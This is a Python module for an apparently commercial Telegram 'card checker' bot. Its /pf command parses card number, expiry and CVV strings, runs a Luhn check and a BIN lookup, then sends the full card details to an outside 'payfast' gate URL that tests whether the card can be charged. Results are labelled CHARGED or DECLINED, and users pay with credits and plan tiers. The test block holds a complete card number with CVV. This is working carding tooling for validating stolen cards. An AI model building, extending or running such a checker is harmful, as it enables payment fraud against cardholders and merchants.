import requests
import re
import random
import logging
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple
import asyncio
from concurrent.futures import ThreadPoolExecutor
import aiohttp
import json
from bin import get_bin_info  # Import get_bin_info function from bin.py
from database import get_or_create_user, update_user_credits, get_user_credits  # Import database functions
from plans import get_user_current_tier # Import the correct function for tier checking
import time
import string
from colorama import Fore, Style, init

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Create a thread pool executor for background tasks
executor = ThreadPoolExecutor(max_workers=100)

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

def luhn_check(card_number: str) -> bool:
    """
    Validate a credit card number using the Luhn algorithm.
    
    Args:
        card_number: The credit card number to validate
        
    Returns:
        True if the card number is valid, False otherwise
    """
    # Remove any spaces or dashes from the card number
    card_number = card_number.replace(' ', '').replace('-', '')
    
    # Check if the card number contains only digits
    if not card_number.isdigit():
        return False
    
    # Check if the card number has a valid length (13-19 digits)
    if len(card_number) < 13 or len(card_number) > 19:
        return False
    
    # Convert the card number to a list of integers
    digits = [int(d) for d in card_number]
    
    # Starting from the rightmost digit, double every second digit
    # If doubling results in a two-digit number, sum the digits
    for i in range(len(digits) - 2, -1, -2):
        digits[i] = digits[i] * 2
        if digits[i] > 9:
            digits[i] = digits[i] % 10 + 1
    
    # Sum all the digits
    total = sum(digits)
    
    # If the total is a multiple of 10, the card number is valid
    return total % 10 == 0

def get_credit_card_details(card_string):
    """Parse card details from various formats"""
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return {
                'number': card_number.replace(' ', ''),  # Remove spaces if any
                'exp_month': month,
                'exp_year': year,
                'cvc': cvv
            }
    
    return None

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

async def check_card_with_payfast(card_details: str, user_info: Dict) -> Optional[Dict]:
    """
    Check card details using the PayFast API.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Dictionary with card details and API response or None if there was an error
    """
    # Parse card details
    parsed = parse_card_details(card_details)
    if not parsed:
        return {
            "card_details": card_details,
            "error": "Invalid card format"
        }
    
    card_number, month, year, cvv = parsed
    
    # Validate the card number using Luhn algorithm
    if not luhn_check(card_number):
        return {
            "card_details": card_details,
            "error": "Invalid card number (failed Luhn check)"
        }
    
    # Get BIN information using the imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Prepare the API URL with the card details
    # Format the card details for the PayFast API
    formatted_card = f"{card_number}|{month}|{year}|{cvv}"
    api_url = f"https://nikhilkhokhar.com/gate=payfast/cc={formatted_card}"
    
    try:
        # Create a session for the request
        timeout = aiohttp.ClientTimeout(total=60)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Make the API request
            async with session.get(api_url) as response:
                if response.status != 200:
                    return {
                        "card_details": card_details,
                        "error": "API request failed"
                    }
                
                # Parse the JSON response
                api_response = await response.json()
                
                # Check if we got a valid response
                if not api_response:
                    return {
                        "card_details": card_details,
                        "error": "Empty response from API"
                    }
                
                # Extract response fields
                errors = api_response.get("errors", [])
                status = "declined"  # Default status for PayFast
                message = errors[0] if errors else "No response message"
                
                return {
                    "card_details": card_details,
                    "card_number": card_number,
                    "month": month,
                    "year": year,
                    "cvv": cvv,
                    "api_response": {
                        "status": status,
                        "response": message,
                        "errors": errors
                    },
                    "brand": brand,
                    "issuer": issuer,
                    "country": country_name,
                    "country_flag": country_flag
                }
    
    except asyncio.TimeoutError:
        return {
            "card_details": card_details,
            "error": "Request timed out. Please try again."
        }
    except aiohttp.ClientError:
        return {
            "card_details": card_details,
            "error": "Network error. Please try again."
        }
    except Exception:
        return {
            "card_details": card_details,
            "error": "An unexpected error occurred. Please try again."
        }

def format_response_payfast(result: dict, user_info: dict) -> Tuple[str, str]:
    """
    Format the API response into a beautiful message with emojis for PayFast gateway.
    
    Args:
        result: Dictionary containing API response
        user_info: Dictionary containing user information
        
    Returns:
        Tuple of (formatted string, status category)
    """
    if "error" in result:
        error_msg = result.get('error', 'Unknown error')
        
        # Create a more visually appealing error message
        formatted_error = f"""<a href='https://t.me/failfr'>⚠️</a> <b>𝙀𝙧𝙧𝙤𝙧 𝘿𝙚𝙩𝙚𝙘𝙩𝙚𝙙</b> ⚠️

<a href='https://t.me/failfr'>💳</a> <b>𝘾𝙖𝙧𝙙:</b> <code>{result.get('card_details', 'Unknown')}</code>

<a href='https://t.me/failfr'>📝</a> <b>𝙍𝙚𝙖𝙨𝙤𝙣:</b> <i>{error_msg}</i>

<a href='https://t.me/failfr'>💡</a> <b>𝙏𝙞𝙥:</b> <i>Please check your card details and try again.</i>"""
        
        return formatted_error, "error"
    
    api_response = result.get("api_response", {})
    card_details = result.get("card_details", "")
    brand = result.get("brand", "N/A")
    issuer = result.get("issuer", "N/A")
    country_name = result.get("country", "Unknown")
    country_flag = result.get("country_flag", "")
    
    # Extract response fields
    status = api_response.get("status", "")
    message = api_response.get("response", "")
    errors = api_response.get("errors", [])
    
    # Check for the specific success message
    success_message = "charged"
    if success_message.lower() in message.lower():
        status_style = "<b>𝘾𝙃𝘼𝙍𝙂𝙀𝘿</b> 🔥"
        status_category = "charged"
    else:
        # Default to declined status
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
        status_category = "declined"
        
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with the exact structure requested
    status_part = f"""<pre><a href='https://t.me/failfr'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{brand}</code>
<b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/failfr'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/failfr'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗣𝗮𝘆𝗙𝗮𝘀𝘁 0.30$</i>
<a href='https://t.me/failfr'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>
{bank_part}
<a href='https://t.me/failfr'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/failfr'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/failurefr_07'>kคli liຖนxx</a>"""
    
    return formatted_response, status_category

# This function will be called from main.py
async def handle_pf_command(update, context):
    """
    Handle the /pf command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            """<a href='https://t.me/failfr'>⚠️</a> <b>𝙈𝙞𝙨𝙨𝙞𝙣𝙜 𝘾𝙖𝙧𝙙 𝘿𝙚𝙩𝙖𝙞𝙡𝙨</b>

<a href='https://t.me/failfr'>📝</a> <b>𝙐𝙨𝙖𝙜𝙚 𝙊𝙥𝙩𝙞𝙤𝙣𝙨:</b>

<i>1️⃣ Direct command:</i>
<code>/pf 4242424242424242|12|25|123</code>

<i>2️⃣ Reply to message:</i>
Reply to any message containing card details with <code>/pf</code>

<a href='https://t.me/failfr'>💡</a> <b>𝙎𝙪𝙥𝙥𝙤𝙧𝙩𝙚𝙙 𝙁𝙤𝙧𝙢𝙖𝙩𝙨:</b>
<code>card:mm:yy:cvv</code>""",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Get user credits BEFORE processing the card
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/failfr'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

<a href='https://t.me/failfr'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/failfr'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/failfr'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Create progress message
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗣𝗮𝘆𝗙𝗮𝘀𝘁 0.30$</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML", disable_web_page_preview=True)
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check with PayFast API
            result = await check_card_with_payfast(card_details, user_info)
            
            # Format the response using format_response_payfast function
            formatted_response, _ = format_response_payfast(result, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.get("error") and not is_unlimited:
                # Deduct 1 credit in the background
                update_user_credits(user_id, -1)
                
                # Get updated credits for the response
                updated_credits = get_user_credits(user_id)
                
                # Add warning if credits are now 0
                if updated_credits is not None and updated_credits <= 0:
                    # Add warning message at the end of the result
                    formatted_response = formatted_response + f"\n\n<a href='https://t.me/failfr'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            # disable_web_page_preview=True is added here to stop link previews
            await checking_message.edit_text(formatted_response, parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            logger.error("Error in background check")
            error_msg = f"""<a href='https://t.me/failfr'>⚠️</a> <b>𝙀𝙧𝙧𝙤𝙧 𝘿𝙪𝙧𝙞𝙣𝙜 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜</b>

<a href='https://t.me/failfr'>📝</a> <b>𝘿𝙚𝙩𝙖𝙞𝙡𝙨:</b> <code>An unexpected error occurred</code>

<a href='https://t.me/failfr'>💡</a> <b>𝙎𝙪𝙜𝙜𝙚𝙨𝙩𝙞𝙤𝙣:</b> <i>Please try again later.</i>"""
            await checking_message.edit_text(error_msg, parse_mode="HTML", disable_web_page_preview=True)
    
    # Schedule the background task without awaiting it to avoid blocking
    asyncio.create_task(background_check())

if __name__ == "__main__":
    # For testing purposes
    test_card = "4553570612769104|04|2026|731"
    test_user = {
        "id": 123456789,
        "username": "testuser",
        "first_name": "Test"
    }
    
    async def test():
        result = await check_card_with_payfast(test_card, test_user)
        formatted, _ = format_response_payfast(result, test_user)
        print(formatted)
    
    asyncio.run(test())
